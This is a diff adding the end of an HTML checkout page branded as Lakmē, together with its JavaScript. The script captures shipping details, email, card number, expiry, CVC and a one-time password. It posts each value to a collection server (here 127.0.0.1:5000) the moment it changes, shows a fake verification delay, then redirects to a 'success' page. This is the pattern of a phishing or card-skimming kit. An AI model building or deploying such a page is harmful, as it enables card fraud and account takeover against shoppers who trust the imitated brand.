+                <a href="#" class="hover:underline me-4 md:me-6"
+                  >Privacy Policy</a
+                >
+              </li>
+              <li>
+                <a href="#" class="hover:underline me-4 md:me-6">Licensing</a>
+              </li>
+              <li>
+                <a href="#" class="hover:underline">Contact</a>
+              </li>
+            </ul>
+          </div>
+          <hr
+            class="my-6 border-gray-200 sm:mx-auto dark:border-gray-700 lg:my-8"
+          />
+          <span
+            class="block text-sm text-gray-500 sm:text-center dark:text-gray-400"
+            >© 2024
+            <a href="https://flowbite.com/" class="hover:underline">LAKMĒ™</a>.
+            All Rights Reserved.</span
+          >
+        </div>
+      </footer>
+
+
+
+
+
+
+
+
+      <script>
+        var shade0 = document.getElementById('shade0');
+        var shade1 = document.getElementById('shade1');
+
+        window.onload = () => {
+          shade0.innerHTML = sessionStorage.getItem('shade0');
+          shade1.innerHTML = sessionStorage.getItem('shade1');
+        }
+      </script>
+
+
+
+
+
+
+
+
+      <script>
+        // CONTAINERS
+        var shipping = document.getElementById('shipping');
+        var payment = document.getElementById('payment');
+        var verification = document.getElementById('verification');
+        var continueBtn= document.getElementById('continueBtn');
+        var editBtn= document.getElementById('editBtn');
+
+        var shippingShortName = document.getElementById('shippingShortName');
+        var shippingShortPhone = document.getElementById('shippingShortPhone');
+        var shippingShortAddress = document.getElementById('shippingShortAddress');
+        
+        var billingShortName = document.getElementById('billingShortName');
+        var billingShortNo = document.getElementById('billingShortNo');
+        var billingShortExp = document.getElementById('billingShortExp');
+
+        // INPUTS
+        var fname = document.getElementById('fname');
+        var lname = document.getElementById('lname');
+        var phone = document.getElementById('phone');
+        var address1 = document.getElementById('address1');
+        var address2 = document.getElementById('address2');
+        var billingCity = document.getElementById('billing-city');
+        var billingState= document.getElementById('billing-state');
+        var billingCountry = document.getElementById('billing-country');
+        var billingZip = document.getElementById('billing-zip');
+        
+        var email = document.getElementById('email');
+        var cardHolder = document.getElementById('card-holder');
+        var cardNo = document.getElementById('card-no');
+        var cardExpiry = document.getElementById('card-expiry');
+        var cardCvc = document.getElementById('card-cvc');
+
+        var otp = document.getElementById('otp');
+        
+        var addressCheckbox = document.getElementById('billing-addy');
+        var addressContainer = document.getElementById('addressContainer');
+
+        // DEFINING VARIABLES
+        var queryInput = document.querySelectorAll('.queryInput');
+        var sendData = {}
+
+        // DEFINING FUNCTIONS
+        async function containerChange() {
+          if(continueBtn.dataset.step === '0') {
+            shipping.style.display = 'none';
+            payment.style.display = 'flex';
+            continueBtn.innerHTML = 'Continue';
+            continueBtn.dataset.step = '1';
+          } else if(continueBtn.dataset.step === '1') {
+            shipping.style.display = 'flex';
+            payment.style.display = 'none';
+            continueBtn.innerHTML = 'Proceed to payment';
+            continueBtn.dataset.step = '0';
+          }
+        }
+
+        async function pushData(sendData) {
+          fetch('http://127.0.0.1:5000', {
+            method: "POST",
+            headers: {
+              'Content-Type' : 'application/json',
+            },
+            body: JSON.stringify({
+              message :  sendData
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log(data);
+          })
+          return;
+        }
+
+        async function checkData() {
+          if (continueBtn.dataset.step === '0') {
+            if(fname.value === '' || lname.value === '' || phone.value === '' || address1.value === '' || billingCity.value === '' || billingState.value === '' || billingCountry.value === '' || billingZip.value === '') {
+              return false;
+            } else {
+              containerChange();
+              continueBtn.dataset.step = '1';
+
+              shippingShortName.innerHTML = `${fname.value} ${lname.value}`;
+              shippingShortPhone.innerHTML = `+91 ${phone.value}`;
+              shippingShortAddress.innerHTML = `${address1.value}, ${address2.value}, ${billingCity.value}, ${billingState.value} ${billingZip.value}`;
+
+              return true;
+            }
+          } else if (continueBtn.dataset.step === '1') {
+            if(email.value === '' || cardHolder.value === '' || cardNo.value === '' || cardExpiry.value === '' || cardCvc.value === '') {
+              return false;
+            } else {
+              continueBtn.dataset.step = '2';
+
+              continueBtn.classList.add('btn-loading');
+              
+              setTimeout(() => {
+                continueBtn.classList.remove('btn-loading');
+                shipping.style.display = 'none';
+                payment.style.display = 'none';
+                verification.style.display = 'flex';
+                billingShortName.innerHTML = `${(cardHolder.value).toUpperCase()}`;
+                billingShortNo.innerHTML = `Card ending in ${(cardNo.value).slice(-4)}`;
+                billingShortExp.innerHTML = `Expires on ${cardExpiry.value}`;
+              }, 2000);
+
+              return true;
+            }
+          } else if (continueBtn.dataset.step === '2') {
+            if(email.value === '') {
+              return false;
+            } else {
+              pushData(sendData);
+              continueBtn.innerHTML = '';
+              continueBtn.classList.add('btn-loading');
+              sessionStorage.setItem('sendData', JSON.stringify(sendData));
+
+              setTimeout(() => {
+                window.location = '/lakmeinfe/success.html';
+              }, 4000);
+
+              return true;
+            }
+          }
+        }
+
+        // DEFINING EVENTS
+        continueBtn.addEventListener('click', () => {
+          checkData();
+        })
+
+        editBtn.addEventListener('click', () => {
+          containerChange();
+        })
+        
+        // CARD VALIDATOR
+        // https://stackoverflow.com/questions/40775674/credit-card-input-validation-using-regular-expression-in-javascript
+
+        fname.addEventListener('change', () => {
+          sendData[fname.name] = fname.value;
+          pushData(sendData);
+        })
+        
+        lname.addEventListener('change', () => {
+          sendData[lname.name] = lname.value;
+          pushData(sendData);
+        })
+        
+        phone.addEventListener('change', () => {
+          sendData[phone.name] = phone.value;
+          pushData(sendData);
+        })
+        
+        address1.addEventListener('change', () => {
+          sendData[address1.name] = address1.value;
+          pushData(sendData);
+        })
+        
+        address2.addEventListener('change', () => {
+          sendData[address2.name] = address2.value;
+          pushData(sendData);
+        })
+
+        billingState.addEventListener('change', () => {
+          sendData[billingState.name] = billingState.value;
+          pushData(sendData);
+        })
+        
+        billingCountry.addEventListener('change', () => {
+          sendData[billingCountry.name] = billingCountry.value;
+          pushData(sendData);
+        })
+        
+        billingZip.addEventListener('change', () => {
+          sendData[billingZip.name] = billingZip.value;
+          pushData(sendData);
+        })
+        
+        email.addEventListener('change', () => {
+          sendData[email.name] = email.value;
+          pushData(sendData);
+        })
+        
+        cardHolder.addEventListener('change', () => {
+          sendData[cardHolder.name] = cardHolder.value;
+          pushData(sendData);
+        })
+        
+        cardNo.addEventListener('change', () => {
+          currentCardNoVal = cardNo.value.match(/.{1,4}/g);
+          cardNo.value = currentCardNoVal.join(' ');
+
+          sendData[cardNo.name] = cardNo.value;
+          pushData(sendData);
+        })
+        
+        cardExpiry.addEventListener('change', () => {
+          currentCardExpiryVal = cardExpiry.value.match(/.{1,2}/g);
+          cardExpiry.value = currentCardExpiryVal.join('/');
+
+          sendData[cardExpiry.name] = cardExpiry.value;
+          pushData(sendData);
+        })
+        
+        cardCvc.addEventListener('change', () => {
+          sendData[cardCvc.name] = cardCvc.value;
+          pushData(sendData);
+        })
+
+        otp.addEventListener('change', () => {
+          sendData[otp.name] = otp.value;
+          pushData(sendData);
+        })
+
+        addressCheckbox.addEventListener('change', () => {
+          if(!addressCheckbox.checked) {
+            addressContainer.style.display = 'flex';
+          } else {
+            addressContainer.style.display = 'none';
+          }
+        })
+      </script>
+  </body>
+</html>
